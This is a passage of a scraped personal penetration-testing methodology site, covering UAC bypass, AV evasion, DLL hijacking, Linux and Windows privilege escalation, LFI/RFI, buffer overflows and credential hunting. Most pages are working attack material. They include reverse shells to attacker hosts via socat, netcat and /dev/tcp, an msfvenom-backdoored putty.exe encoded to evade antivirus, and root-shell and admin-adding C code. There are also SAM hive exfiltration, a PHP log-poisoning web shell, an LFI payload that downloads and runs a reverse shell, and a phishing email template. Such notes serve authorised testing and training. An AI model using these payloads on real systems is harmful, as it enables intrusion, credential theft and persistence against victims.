session\nRun -> msconfig OR Startmenu -> msconfig\n# we can spawn a shell from a High Integrity Level program\nRun High IL Program -> Help -> View Source (Opens a notepad) -> Open C:\\Windows\\System32\\cmd.exe \n Auto-Elevating Processes: For an application, some requirements need to be met to auto-elevate: The executable must be signed by the Windows Publisher The executable must be contained in a trusted directory, like  %SystemRoot%/System32/  or  %ProgramFiles%/ Depending on the type of application, additional requirements may apply: Executable files (.exe) must declare the  autoElevate  element inside their manifests. To check a file's manifest, we can use  sigcheck , a tool provided as part of the Sysinternals suite. You can find a copy of sigcheck on your machine on  C:\\tools\\ \u00a0. If we check the manifest for msconfig.exe, we will find the autoElevate property: \n set REG_KEY=HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\nset CMD=\"powershell -windowstyle hidden C:\\Tools\\socat\\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes\"\nreg add %REG_KEY% /v \"DelegateExecute\" /d \"\" /f\nreg add %REG_KEY% /d %CMD% /f\nnc -lvp 4444 \n Other: reg add \"HKCU\\Software\\Classes\\Folder\\shell\\open\\command\" /d \"cmd.exe /c C:\\Users\\user\\nc.exe -nv 0.0.0.0 445 -e cmd.exe\" /f && reg add HKCU\\Software\\Classes\\Folder\\shell\\open\\command /v \"DelegateExecute\" /f Metasploit UAC bypass: exploit(windows/local/bypassuac_sdclt)\n#Another that might work\nhttps://github.com/L3cr0f/DccwBypassUAC \n \n Bypassing Always Notify: \n #TODO",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/UAC Bypass a1319b8fe70942cca83008cee3a62da1.html"
  },
  {
    "title": "Web Methodology",
    "body": "Web Methodology \n \n gobuster ( -k for https ) gobuster dir -w </usr/share/wordlists/dirbuster/directory> -u http://<ip> -t 20 \n Nikto nikto -host http://<ip> \n webdav servers davtest -url http://<ip> #webdav enumration /manager/html and /phpmyadmin .htaccess and .htpasswd \n subdomain enumeration amass gobuster gobuster vhost -u <url> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30 \n https://meyerweb.com/eric/tools/dencoder/ \n Web Shells: PHP: https://github.com/flozz/p0wny-shell aspx https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Web Methodology e2169090e5f940619273e961f0212c40.html"
  },
  {
    "title": "AV Evasion",
    "body": "AV Evasion \n Most Anti-Virus operate on signature based detection. There is also heuristic (behavioral) detection \n Signature AV bypass: Custom payloads Obfuscation Encoding/Encrypting Scrambling (ex. \u2018Mimikatz\u2019 \u2192 \u2018miMi\u2019+\u2019KaTz\u2019) Tools Shellter  -  https://github.com/ParrotSec/shellter Donut  -  https://github.com/TheWover/donut msf payload (64-Bit) encoded with 10 iterations backdoored as putty.exe. msfvenom -p windows/X64/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=8443 EXITFUNC=thread -f exe -o test.exe -e x64/zutto-dekiru -i 10 -x ./putty.exe -k\n#disable the standard api autolaod in meterpreter\nmsfconsole > exploit/multi/handler > set AutoLoadStdapi false\nshow advanced Heuristic bypass: polymorphism Custom payloads \n Scarecrow  -  https://github.com/optiv/ScareCrow \n \n View Windows Defender exclusions: cmd.exe /c reg query \"HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows Defender/Exclusions/Paths\u201d",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/AV Evasion 0b226792e2d94e9fb14be97ac4a8b533.html"
  },
  {
    "title": "DLL Hijacking",
    "body": "DLL Hijacking \n Dynamic Link Library Shared Library Usually run with executable \n Run Process Monitor tool (procmon.exe) Find services that may be vulnerable\u2026 Filter \u2192 process name \u2192 is <found_service> \u2192 hit add  Filter \u2192 by result \u2192 is NAME NOT FOUND \u2192 hit add hit apply Look for the missing dll when the service is started and replace it! \n set path \u2192 ends with \u2192 dll find writable folder or files \n sc start dllsvc\nsc stop dllsvc\nsc start dllsvc // x64: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll\n// x86: i686-w64-mingw32-gcc windows_ddl.c -shared -o output.dll\n\n#include <windows.h>\n\nBOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {\n\t\tif (dwReason == DLL_PROCESS_ATTACH) {\n\t\t\t\tsystem(\"cmd.exe /k net localgroup administrators user /add\");\n\t\t\t\tExitProcess(0);\n\t\t}\n\t\treturn TRUE;\n}",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/DLL Hijacking 9e61cdf7b5904b0185764410dfd707c7.html"
  },
  {
    "title": "Scanning & Enumeration",
    "body": "Scanning & Enumeration arp-scan -l  netdiscover use arp to discover machines on the network \n Under 64 on a ping is high probability Linux Under 128  is high probability Windows \n Host discovery Scripts: sudo nmap -sU --top-ports 100 $target \n Port scanning scripts: nmap -sC -sV -p 135,445 0.0.0.0 --script=safe\n\nnmap -script=smb-vuln\\* -p445 0.0.0.0 \n Nmap: nmap -sS (stealth scan, sends SYN with RST flag so connection doesnt actually connect) nmap -T4 -p- -A <ip address> -T5 = speed of 5 -p- = all ports scan otherwise scans top 1000 ports -A = All everything scripts scans etc -sU = udp scan -sV = enumerate Version -sT = TCP connect -sC = default enumeration scripts -pN = dont worry about pinging -script vuln = vulnerability detection scripts (safe?) \n Nmap with nessus scan, then while scanning go ahead and do information gathering stuff",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Scanning & Enumeration e48843f5bf314eb48b12c918c6edd5bb.html"
  },
  {
    "title": "Startup Applications",
    "body": "Startup Applications \n \n #Using accesschk.exe, note that the BUILTIN\\Users group can write files to the StartUp directory:\nC:\\PrivEsc\\accesschk.exe /accepteula -d \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"\n#Using cscript, run the C:\\PrivEsc\\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:\ncscript C:\\PrivEsc\\CreateShortcut.vbs\n#Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:\nrdesktop -u admin 0.0.0.0 Similar to autoruns: icacls.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n#Notice the groups with F (Full access)\ncopy program.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\" If startup as full read write execute access we can continue \n msfconsole user multi/handler\npayload windows/meterpreter/reverse_tcp\n\n#send to http server\nComputer -> C:ProgramData\nMicrosoft\\Windows\\Start Menu\\Startup\n#log out and start up as another user \n .\\accesschk.exe /accepteula -d \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\" CreateShortcut.vbs Set oWS = WScript.CreateObject(\"WScript.Shell\")\nsLinkFile = \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\reverse.lnk\"\nSet oLink = oWS.CreateShortcut(sLinkFile)\noLink.TargetPath = \"C:\\reverse.exe\"\noLink.Save To run: cscript CreateShortcut.vbs",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Startup Applications c46ca5ac38fa4c59be021c4b62732070.html"
  },
  {
    "title": "SMTP (25)",
    "body": "SMTP (25) Verifying usernames: nc -nv <IP> 25\nEXPN\nVRFY root\nVRFY <machine name>\nVRFY <other prev users?> \n Try accessing using telnet client: telnet <IP> 25 nmap enumeration: nmap <IP> -p 25 --script=smtp-* Wireshark: try capturing port 25 wireshark Client side email examples: MAIL FROM:<test@victim>\nRCPT TO:<test2@victim>\n\nDATA\n\nurgent\nhttp://192.168.119.137/fp/shell.exe\n. \n From: [me] <test>\nTo: <[victim@victim](mailto:test2@victim)>\nDate: Fri, 27 Oct 2022 06:14:11 +0000\nSubject: job application\nMime-Version: 1.0;\ncharset=\"ISO-8859-1\";\nContent-Transfer-Encoding: 7bit;\n<html>\n<body>\njob application\n[http://127.0.0.1/fp/index.html](http://127.0.0.1/fp/index.html)\n</body>\n</html>",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/SMTP (25) f890bd1bfa9448c99149d54c351f230c.html"
  },
  {
    "title": "Mass Assignment",
    "body": "Mass Assignment Parameter fields can be used to set variables\u2026. We can change the request type from GET to POST, etc to make changes to a products price or a users permission levels.",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Mass Assignment 6b2508b7b07948dba32815e1eeffd548.html"
  },
  {
    "title": "8. Software and Data Integrity Failures",
    "body": "8. Software and Data Integrity Failures https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/ \n Examples: Scenario #1 Update without signing:  Many home routers, set-top\nboxes, device firmware, and others do not verify updates via signed\nfirmware. Unsigned firmware is a growing target for attackers and is\nexpected to only get worse. This is a major concern as many times there\nis no mechanism to remediate other than to fix in a future version and\nwait for previous versions to age out. \n Scenario #2 SolarWinds malicious update : Nation-states have been\nknown to attack update mechanisms, with a recent notable attack being\nthe SolarWinds Orion attack. The company that develops the software had\nsecure build and update integrity processes. Still, these were able to\nbe subverted, and for several months, the firm distributed a highly\ntargeted malicious update to more than 18,000 organizations, of which\naround 100 or so were affected. This is one of the most far-reaching and\nmost significant breaches of this nature in history. \n Scenario #3 Insecure Deserialization:  A React application calls a\nset of Spring Boot microservices. Being functional programmers, they\ntried to ensure that their code is immutable. The solution they came up\nwith is serializing the user state and passing it back and forth with\neach request. An attacker notices the \"rO0\" Java object signature (in base64) and\nuses the Java Serial Killer tool to gain remote code execution on the\napplication server. Prevention: Ensure libraries and dependencies are using trusted sources implement software supply chain security tool",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/8 Software and Data Integrity Failures 92a4d050ff4a4b75b2f9f1df06d39261.html"
  },
  {
    "title": "Initial Enumeration",
    "body": "Initial Enumeration System Enumeration Hostname: hostname Kernel info: uname -a\nuname -r cat /proc/version cat /etc/issue CPU Architecture Info: lscpu Services Running: ps -aux\nps -aux | grep root\nps -aux | grep '^root'\n#Look for possible vuln running services Check shell type: echo $0 User Enumeration Get Current User: whoami See uid, gid id Programs that can be ran as sudo: sudo -l Users: cat /etc/passwd\ncat /etc/passwd | cut -d : -f 1 Password hashes: cat /etc/shadow History: History Quick wins: Who they are, what can they run, whats their history... Network Enumeration IP Address ifconfig\nip a\ndual hommed rotues Routes: route Arp Tables: ip neigh Open Connections: netstat -ano Password Hunting Find the word password throughout the machine grep --color=auto -rnw '/' -ie \"PASSWORD=\" --color=always 2> /dev/null\n\ngrep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2> /dev/null\n\ngrep --color=auto -rnw '/' -ie \"PASS\" --color=always 2> /dev/null\n Password filename: locate password | more\nlocate pass | more\nlocate pwd | more Find SSH Keys on the Machine: find / -name id_rsa 2> /dev/null mountable drives: mount\ncd /media/sdb (drive)",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Initial Enumeration 33f70a60434d4c8686235eff2442adeb.html"
  },
  {
    "title": "IOS Static Analysis",
    "body": "IOS Static Analysis \n Apple doesn't allow download of Apps outside the appstore. All apps are signed by apple. Bypass: Xcode (IOS App development) Jailbreaking \n \n iPhones have 2 partitions in their file system User partition OS partition Hardware often has security implementations as well as software \n \n Static analysis: Most iOS apps built in objective C, Swift is the latest version apps are in .ipa format (similar to android apk) .ipa contains: /Payload/Application.app - the application itself /Payload/iTunesMetadata.plist - Info about the app developer\n/Payload/Application.app/Info.plist - Where important app info is stored (Similar to\nAndroid Manifest.xml) Various json files, Assets or Resources unique to the app",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/IOS Static Analysis 9c8ecc8d1370404aa89c95a0d0b0fe62.html"
  },
  {
    "title": "Cross-Origin Resource Sharing (CORS)",
    "body": "Cross-Origin Resource Sharing (CORS) \n CORS vulnerabilities arise from CORS configuration issues CORS - mechanism that uses http headers to define origins that the browser permit loading resources \n Same Origin Policy (SOP) - Rule enforced by browsers that controls access between 2 web applications Prevents reading between 2 applications Access is determined based on the origin \n If scheme, domain, and port are the same it is allowed by the SOP scheme - http/https domain - test.com port - 80/443 \n Headers: Access-Control-Allow-Origin - Access-Control-Allow-Origin: *\nAccess-Control-Allow-Origin: <origin>\nAccess-Control-Allow-Origin: null Access-Control-Allow-Credentials - Only available when origin is used Not allowed when: Access-Control-Allow-Origin: * Used for authenticated pages \n \n CORS Vulnerabilities: Dynamic generation: Developer workaround for limited CORS configuration Reflecting back origin to the user Errors parsing origin headers Granting access to specific string regex rules Granting access to all domains starting with a specific value Granting access to all domains ending with a specific value Whitelisted null origin value \n Testing: map the application Test the app for dynamic generation is user supplied ACAO header reflected? Does it validate specific start or end of a string? Does it allow a null origin? Does it restrict the protocol? Does it allow the passing of credentials? \n \n Prevention: Proper CORS configuration Only allow trusted sites avoid whitelisting null avoid wildcards in internal networks \n Examples: Basic origin reflection: #If 'Access-Control-Allow-Credentials: true' in the application\n#put this in your request headers to see if it reflects\nOrigin: http://malicious-website.com",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Cross-Origin Resource Sharing (CORS) 5f8fe78e85c14e4596a14ccf47e74a9c.html"
  },
  {
    "title": "General",
    "body": "General Linux Guides: https://sirensecurity.io/blog/linux-privilege-escalation-resources/ https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Linux - Privilege Escalation.md https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html \n See what tools are installed that I usually use (which python3, which wget, which curl, which nc, etc. Also uname -a to see kernel version. list out all files in directories such as /tmp, /opt, /mnt, /media, /home,\n/etc/passwd (write perms?), /var/www/ (config files?), numerous times\njust doing this has shown me the path to root that other scripts\nwouldn't really find. echo $PATH (anything weird?), cat /etc/crontab (any weird jobs?), sudo -l (any sudo perms?) finally, look for SUID perms on files and compare output against  https://gtfobins.github.io/ find  /  -perm  u=s  -type f 2>/ dev / null Restricted Bash: https://0xffsec.com/handbook/shells/restricted-shells/ #Creating a space in bash terminal\n${IFS} Bash root process escalation: developer@faculty:~$ ps faux | grep ^root | grep python3\nroot   731   0.0  0.9  26896 18200   Ss   Jul02   0:00 /usr/bin/python3 .....\ndeveloper@faculty:~$ gdb -p 731\nAttaching to process 731\n(gdb) call (void)system(\"chmod u+s /bin/bash\")\nquit\nbash -p Git: GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone gituser@0.0.0.0:/git-server\ncd git-server\nkali@kali:~/git-server$ git config --global user.name \"kali\"\nkali@kali:~/git-server$ git config --global user.email \"kali@kali.(none)\"\n#\nkali@kali:~/git-server$ echo \"sh -i >& /dev/tcp/0.0.0.0/8080 0>&1\" >> backups.sh \nkali@kali:~/git-server$ chmod +x backups.sh\n#\nkali@kali:~/git-server$ GIT_SSH_COMMAND='ssh -i ~/id_rsa -p 43022' git push origin master\nEnumerating objects: 5, done.\nCounting objects: 100% (5/5), done.\nDelta compression using up to 4 threads\nCompressing objects: 100% (3/3), done.\nWriting objects: 100% (3/3), 302 bytes | 302.00 KiB/s, done.\nTotal 3 (delta 1), reused 0 (delta 0), pack-reused 0\nTo 192.168.120.204:/git-server\n   b50f4e5..0212790  master -> master\nkali@kali:~/git-server$",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/General e09afef9e3c545618c53accaf51bc1b0.html"
  },
  {
    "title": "3. Injection",
    "body": "3. Injection https://owasp.org/Top10/A03_2021-Injection/ \n Causes: User-supplied data is not validated, filtered, or sanitized by the application. Dynamic queries or non-parameterized calls without context-aware escaping are used directly in the interpreter. Examples: XSS (See page) SQL Injection (See page) Command Injection (See page) \n Prevention Keep data separate from commands and queries Parameterized Statements Ensure inputs (parameters) are used safely in SQL statements Example: \u201cSELECT * FROM users WHERE email =?\u201d; Example: \u201cSELECT * FROM users WHERE email =\u2019\u201d + email + \u201c\u2019\u201d; Sanitizing Input For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter. Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/3 Injection 845bc9e274a94273adc71edf92d98a72.html"
  },
  {
    "title": "Tools",
    "body": "Tools Linpeas:\n https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS Then:  Linenum.sh :\n https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh Linux Exploit suggester:\n https://github.com/mzet-/linux-exploit-suggester LinuxPrivchecker.py :\n https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py Linpeas: # Look for red/yellows\n./linpeas.sh Linux Exploit suggester: ./LinuxExploitSuggester LinuxPrivchecker: ./LinuxPrivchecker.py",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Tools ef229c5d34b44f8183b8afd75d407bd4.html"
  },
  {
    "title": "Passwords & Port Forwarding",
    "body": "Passwords & Port Forwarding Plink Download -  https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html Putty Plink for port forwarding: plink.exe -l root -pw toor -R 445:127.0.0.1:445 <Attackers-IP>\n#edit ssh config for plink\nsudo gedit /etc/ssh/ssh_config\n#uncomment permitrootlogon and set to enabled^ \n \n Password Hunting: Registry: #The registry can be searched for keys and values that contain the word \"password\":\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n#If you want to save some time, query this specific key to find admin AutoLogon credentials:\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon\"\n#On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):\nwinexe -U 'admin%password' //10.10.109.12 cmd.exe winexe: (execute commands on windows from kali) winexe -U Administrator%Welcome1! //127.0.0.1 \"cmd.exe\"\nwinexe -U Administrator%Welcome1! --system //127.0.0.1 \"cmd.exe\" \n Directory: dir /s *pass* == *.config\nfindstr /si password *.xml *.ini *.txt \n Saved Credentials: cmdkey /list\nrunas /savecred /user:admin C:\\PrivEsc\\reverse.exe SAM: copy C:\\Windows\\Repair\\SAM \\\\0.0.0.0\\kali\\\ncopy C:\\Windows\\Repair\\SYSTEM \\\\0.0.0.0\\kali\\\n\ngit clone https://github.com/Tib3rius/creddump7\npip3 install pycrypto\npython3 creddump7/pwdump.py SYSTEM SAM\n\nhashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt\n\n\n#backups may exist in...\nC:/Windows/System32/config\nC:/Windows/Repair/\nC:/Windows/System32/config/RegBack",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Passwords & Port Forwarding d0408fee6bcf42618b73064809d63b21.html"
  },
  {
    "title": "Sudo Escalations",
    "body": "Sudo Escalations Sudo shell escapes: sudo -l\n# look for NOPASSWD\n gtfobins.github.io : look up what we can do with sudo -l programs Specifically look at Sudo section Intended Functionalities: sudo apache3 -f /etc/shadow we can see shadow file from apache3 \n Edit /etc/passwd openssl passwd mypass\nadd to /etc/shadow\nadd user in /etc/passwd\ntry to ssh CVE Exploits sudo -V LD-Preload:\n sudo -l -> you\u2019ll see env_keep+=LD_PRELOAD Shell.c #include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\nunsetenv(\"LD_PRELOAD\")\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/bash\")\n\n}\n\ngcc -fPIC -shared -o shell.so shell.c\n sudo LD_PRELOAD=/home/user/shell.so apache2 \n \n LD-Library Path: ldd /path/to/program pick outputted library to replace #include <stdio.h>\n#include <stdlib.h>\n\nstatic void hijack() __attribute__((constructor));\n\nvoid hijack() {\n\tunsetenv(\"LD_LIBRARY_PATH\");\n\tsetresuid(0,0,0);\n\tsystem(\"/bin/bash -p\");\n\n}\ngcc -fPIC -shared -o shell.so shell.c\nsudo LD_LIBRARY_PATH=. /path/to/program\n CVE-2019-14287 https://www.exploit-db.com/exploits/47502 sudo -u#-1 /bin/bash \n CVE-2019-18634 https://github.com/saleemrashid/sudo-cve-2019-18634 \n vulnerability in pwfeedback \u2192 This is feedback **** when you enter a string in sudo password. Must be enabled. #Check for sudo versions before 1.8.26\nsudo -V",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Sudo Escalations bd7f41e114eb4a1d943cf4e7613af85d.html"
  },
  {
    "title": "OWASP Top 10",
    "body": "OWASP Top 10 Resources: https://github.com/tanprathan/OWASP-Testing-Checklist https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf https://owasp.org/Top10/ \n \n 2017 List: Injection Attacks: SQL Injections malicious SQL commands injected into a database Classic SQL  Login Injection admin' OR 1=1 --  \n Repeater shows a lot more information than manual testing \n Blind SQL injection: Testing commands and observing how the website reacts. test' (sleep 5)\ntest' (sleep 10) SQL Injection Defense: Parameterized Statements Ensure inputs (parameters) are used safely in SQL statements Example: \u201cSELECT * FROM users WHERE email =?\u201d; Example: \u201cSELECT * FROM users WHERE email =\u2019\u201d + email + \u201c\u2019\u201d; Sanitizing Input \n Broken Authentication credential stuffing brute force attacks sending hundred of requests default or well known passwords Forgot password processes MFA Session IDs in URL, Rotating Session IDs (session fixation) Testing: invalid email or password statements (information disclosures) Session fixation Forgot password process default credentials MFA Sensitive Data Exposure Personally identifiable information exposed clear text passwords information in source code Don\u2019t store sensitive data unnecessarily Strong passwords Testing Enumeration: discovering items that should not be exposed response headers and cookies in burp securityheaders.com nmap --script=ssl-enum-ciphers 445 tesla.com attackable ciphers XXE (XML External Entities) Attacking systems that parse XML input Dos, LFI, RCE etc. XML basics <?xml version=\"1.0\" encoding=\"ISOBLAH\"\n<!DOCTYPE gift [\n\t<!ENTITY from \"C:/Heath&Amber\">\n]>\n\n<gift>\n\t<To>Frnak</To>\n\t<From>&from;</From>\n\t<Item>Cards</Item>\n</gift>  google XXE Payloads Payloads all the things We can put malicious characters in our entities that are banned in normal use File upload features Bypassing whitelisted extensions Broken Access Control User gets access to somewhere they shouldn't trying to get admin areas IDORs \u2192 seeing someone else's information inspect element on hidden hold values Forging feedback Security Misconfigurations default credentials on webpages Unnecessary features with vulnerabilities, things exposed bad settings Use best practices! changes default passwords! \n XSS (Cross site scripting) Reflected \u2192 server reads and responds. It reflects back on the page. Alert script example, Stealing Cookies Stored \u2192 inject a payload and we can leave and come back it will still be there Comment section, blog posts DOM \u2192 exploiting DOM client side Reflected and DOM require social engineering Inspecting anything with input or parameters XSS Payloads and try them through BURP intruder. Preventing XSS: Encoding < becomes &lt; <script> becomes &lt;script> Filtering <script> become script Validating Comparing input against whitelist Sanitization Combination of escaping, filtering, validation Insecure Deserialization Taking data into a serialized format\u2026 XML Json Binary etc Deserialization is opposite of that process We can send malicious serialized commands and it will be deserialized and attacked Don\u2019t accepted Serialized objects from untrusted sources Using component with known vulnerabilities Deprecated versions with CVEs Always be patching Insufficient logging and monitoring Logging and monitoring failed logins, suspicious behavior. Are you getting caught while pentest scans are happening?",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/OWASP Top 10 45d530227e294bd8b3a4a58ae46a6945.html"
  },
  {
    "title": "WEP",
    "body": "WEP Reaver attack #TODO \n ARP replay attack #TODO",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/WEP 6538aadd86854b978739393ffd72a064.html"
  },
  {
    "title": "Webdav",
    "body": "Webdav \n cadaver http://0.0.0.0/webdav Get the files that are available to be uploaded to the server davtest -url http://0.0.0.0/webdav \n curl http://0.0.0.0/ --upload-file file.txt\n#we can use curl to rename file after upload if there is an error uploading original filetype\ncurl -X MOVE --header \"Destination:http://0.0.0.0/file.aspx\" http://0.0.0.0/file.txt",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Webdav 5ad3df1a6402443caa2c5c5951c6203e.html"
  },
  {
    "title": "Buffer Overflow",
    "body": "Buffer Overflow Windows: Spiking: Run immunity debugger as admin File \u2192 attach \u2192 click program Get your ip Check each input to try and find the BoF vulnerability generic_send_tcp #stats.spk #_readline\n#_string(STATS );\n#_string_variable(\"0\");  generic_send_tcp <ip> 9999 stats.spk 0 0\n#repeat for each input\n \n Fuzzing: keep immunity debugger up attached python fuzzing script: #!/usr/bin/python\nimport sys, socket\nfrom time import sleep\nbuffer = \"A\" * 100\nwhile True:\n\t\t\t\tTry:\n\t\t\t\t\t\ts=socket.socket(socket.AF_INET.socket.SOCK_STREAM)\n\t\t\t\t\t\ts.connect((<ip>,<port>))\n\t\t\t\t\t\ts.send(()) chmod  +x <script> \n Finding the Offset: Pattern create /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <pattern number>\n Add the pattern to script or just send check EIP, take its value, find offset /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <pattern number> -q <EIP Value> Overwriting EIP: Replace offset with shellcode: \u201cA\u201d * <found offset> + \u201cB\u201d * 4 B should control the EIP now \n Finding Bad Chars: remove \\x00 Add bad chars to end of \u201cB\u201d on payload Look at hex dump We should see 01 \u2192 FF, if not the missing number is probably a bad char. consecutive bad chars usually only the first is bad char but we can take out both as precaution \n \n Finding the Right Module: Look for process   !mona modules\n*Look for a module with protections turned OFF note its address and use it*\n*note the format should be entered from right to left using \"\\x00\" notation* mona.py Looking for something to attach to program locate nasm_shell\nnasm_shell\nJMP ESP -> FFE4\n!mona find -s \"\\xff\\xe4\" -m <found-(dll/exe)>\n#OR (Include bad chars in string)\n!mona jmp -r esp -cpb \"\\x00\"\n#Now note the format should be entered from right to left using \"\\x00\" notation* \n edit python script \u201cA\u201d * <offset> + <little endian shellcode> \n Generating Shellcode & root: msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=<thread> -f c -a x86 -f python -b \"\\x00(bad chars)\" add generated shellcode to python script add + \u201c\\x90\u201d (NOP) *32 + overflow set netcat listener and send of BoF \n \n Create a directory at:  c:\\mona !mona config -set working folder c:\\mona !mona bystearray -cpb \u201c\\x00\u201d !mona compare -f c:\\mona\\bytearray.bin -a ESP",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Buffer Overflow b384e01492734f15802300a7c5db5646.html"
  },
  {
    "title": "LFI/RFI",
    "body": "LFI/RFI \n LFI Example: http://example.com/index.php?page=/etc/passwd LFI Log poisoning Example in Burp Suite:\nGET /file.php?file=../../../../var/log/apache2/access.log&cmd=cat+var/www/file\n#User agent\nUser-Agent: <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>\n... \n \n ../../../../../../etc/passwd%00 \u2192 Works for old versions of PHP Payloadsallthethings php filters https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File Inclusion/README.md http://IP/page.php?page=data:text/plain,<?php](http://0.0.0.0/section.php?page=data:text/plain,%3C?php)> echo shell_exec(\"curl [http://IP/reverseshell.sh](http://ip/reverseshell.sh) --output /tmp/reverseshell.sh\");?>\n\nhttp://IP/page.php?page=data:text/plain,<?php](http://0.0.0.0/section.php?page=data:text/plain,%3C?php)> echo shell_exec(\"bash /tmp/reverse.sh\");?> \n PHP Filters: we can combine PHP filters to get a resource with all filters applied 0.0.0.0/index.php?filter http://0.0.0.0/index.php?php://filter/convert.base64-encode/resource=file.php python php_filter_chain_generator.py --chain 'A' | tail -n 1 | urlencode\n\npython php_filter_chain_generator.py --chain '<?php phpinfo();?>' | tail -n 1 | urlencode \n urlencode: import sys\nimport urllib.parse\n \nunencoded = ''\n \nfor line in sys.stdin:\n        unencoded += line\n \nprint(urllib.parse.quote(unencoded.rstrip('\\n\\r'), safe=''), end='') http://0.0.0.0/index.php?php://filter/convert.base64-encode/resource=file.php \n \n RFI Example: http://example.com/index.php?url=http://attacker.com/malicious.php",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/LFI RFI 9a426f51e2cd4d16afeca4ca048bb9ed.html"
  },
  {
    "title": "Windows",
    "body": "Windows TO BOX: Certutil certutil -urlcache -f http://ip:port/file filename SMB file transfer: kali> mcd smb\ncopydir\ncd smb\nimpacket-smbserver rxxpr .\nvictim> net use *check connections*\nnet use * \\\\<ip>\\rxxpr\ncd Windows\\tasks\ncopy Z:\\whoami.exe\nset PATH=%PATH%;C:\\Windows\\tasks (run whoami from anywhere)\ncopy C:\\stuff Z:\\loot\n\n...\nnet use /d Z:\\\ndel * (removes all files in windows task dir) Python ftp server for Windows \u2192 kali #in kali\npip3 install pyftpdlib\npython -m pyftpdlib -p 21 --write\n#go to Desktop\\tools\\source folder\n#in windows\nftp <ip>\nput windows_service.c\n\n#replace system command with\ncmd.exe /k net localgroup administrators user /add\n#you may need to run:\n#sudo apt install gcc-mingw-w64\nsudo apt install x85_64-w64-mingw32-gcc windows_service.d -o x.exe\n#copy generated file x.exe to Windows\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\\temp\\x.exe /f\n#\nsc start regsvc\n#confirm\nnet localgroup administrators  Powershell Commands: Powershell.exe Invoke-WebRequest -Uri \"http://0.0.0.0/file.exe\" -OutFile \"pwn.exe\"\n\nwget \"http://www.contoso.com\" -outfile \"file\"\n\npowershell -c 